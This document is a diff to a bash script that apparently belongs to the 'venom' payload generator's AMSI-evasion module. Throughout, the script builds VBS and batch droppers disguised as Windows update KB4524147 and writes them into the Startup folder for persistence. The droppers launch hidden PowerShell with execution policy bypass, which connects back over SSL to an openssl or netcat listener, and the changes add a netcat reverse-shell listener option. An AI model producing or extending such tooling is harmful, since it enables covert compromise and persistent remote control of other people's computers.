@@ -12096,9 +12096,12 @@ ACTIVE_ON : $set_dates
 !
 ## Execute Sellected Handler Settings to Run.
 echo "${YellowF}[i]${white} Handler Sellection .. ";sleep 1
-sellection=$(zenity --list --title "☠ HANDLER SELLECTION ☠" --text "\nChose From Available Options:" --radiolist --column "Pick" --column "Option" TRUE "Run Sellected Handler (default)" FALSE "Chose A New Handler File" FALSE "Return to Amsi Evasion Menu" --width 350 --height 230) > /dev/null 2>&1
+sellection=$(zenity --list --title "☠ HANDLER SELLECTION ☠" --text "\nChose From Available Options:" --radiolist --column "Pick" --column "Option" TRUE "Run Sellected Handler (default)" FALSE "Chose A New Handler File" FALSE "Just Start Netcat -lvp [port]" FALSE "Return to Amsi Evasion Menu" --width 350 --height 260) > /dev/null 2>&1
 if [ "$sellection" = "Run Sellected Handler (default)" ]; then
    xterm -T " PERSISTENCE HANDLER - $set_lhost:$set_lport" -geometry 110x23 -e "echo StartUp: [$set_name][Silent:$set_state];$set_handler"
+elif [ "$sellection" = "Just Start Netcat -lvp [port]" ]; then
+   echo -n "${YellowF}[i]${white} Input Listing Port Number: "; read revport
+   xterm -T " PERSISTENCE HANDLER " -geometry 110x23 -e "sudo netcat -lvp $revport"
 elif [ "$sellection" = "Chose A New Handler File" ]; then
    sleep 1;clear;sh_per_handler
 else
@@ -12152,7 +12155,7 @@ if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 ## Display final settings to user
-if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then ext="vbs";tech="In-Memory"; else ext="ps1";tech="\$env:$rpath"; fi
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then ext="vbs";tech="In-Memory"; else ext="ps1";tech="trigger:$rpath"; fi
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
@@ -12191,7 +12194,6 @@ else
    echo "${BlueF}[☠]${white} Building Obfuscated vbs dropper ..${white}";sleep 2
    ## Silent Execution -> OBFUSCATION=ON (none PS terminal window pops up)
    # REMARK: A MessageBox will pop up announcing that are KB updates available.
-   # TODO: Wait for @coding9 to know if shell works.. then: & ('ie'+'x')
    echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
    echo "Dim domain,x,u" >> $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
@@ -12312,8 +12314,8 @@ Colors;
 imp=$(which openssl)
 ## Make sure openssl dependencie its installed
 if ! [ "$?" -eq "0" ]; then
-   echo "${RedF}[x]${BlueF} [${YellowF}openssl${BlueF}]${white} package not found, Please install it .."${Reset};sleep 2
-   echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}execute${BlueF}]${YellowF} sudo apt-get install openssl"${Reset};sleep 2
+   echo "${RedF}[x]${BlueF} [${YellowF}openssl${BlueF}]${white} package not found, Please install it .."${Reset};sleep 1
+   echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}execute${BlueF}]${YellowF} sudo apt-get install openssl"${Reset};sleep 4
    sh_exit
 fi
 
@@ -12337,9 +12339,6 @@ Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB452
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
-## Delete old certs to prevent future errors.
-rm $IPATH/output/cert.pem > /dev/nul 2>&1
-rm $IPATH/output/key.pem > /dev/nul 2>&1
 
 
 ## setting default values in case user have skip this ..
@@ -12405,9 +12404,7 @@ else
       ## Silent Persistence script execution (no terminal prompt) using VBS script.
       echo "echo ' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
-      echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
-      #echo "echo objShell.Run \"cmd /c attrib +h +s +r KB4524147_$random_name.update.vbs\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
- 
+      echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat 
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
@@ -12415,7 +12412,6 @@ else
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      # echo "echo attrib +h +s +r KB4524147_$random_name.update.bat >> \"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    fi
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
@@ -12452,8 +12448,11 @@ echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" 
 echo "}" >> $IPATH/output/$NaM.ps1
 
 
-## Generate SSL certificate openssl
+## Generate SSL certificate (openssl)
 cd $IPATH/output
+## Delete old certs to prevent future errors.
+rm $IPATH/output/cert.pem > /dev/nul 2>&1
+rm $IPATH/output/key.pem > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
 xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
@@ -12525,7 +12524,7 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "SILENT:$easter_egg" > $IPATH/output/persistence_ID_$random_name.handler
    echo "LPORT:$lport" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "LHOST:$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DIR: cd venom/output" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER_DIR:venom/output" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER:sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "ACTIVE_ON=$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
@@ -12534,10 +12533,8 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      #echo "attrib -h -s -r \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
    else
-      #echo "attrib -h -s -r \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
    fi
    echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/persistence_ID_$random_name.handler
@@ -12655,7 +12652,6 @@ else
       echo "echo ' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
-      #echo "echo objShell.Run \"cmd /c attrib +h +s +r KB4524147_$random_name.update.vbs\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
@@ -12663,7 +12659,6 @@ else
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      # echo "echo attrib +h +s +r KB4524147_$random_name.update.bat >> \"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
@@ -12769,10 +12764,8 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      #echo "attrib -h -s -r \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
    else
-      #echo "attrib -h -s -r \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
    fi
    echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/persistence_ID_$random_name.handler
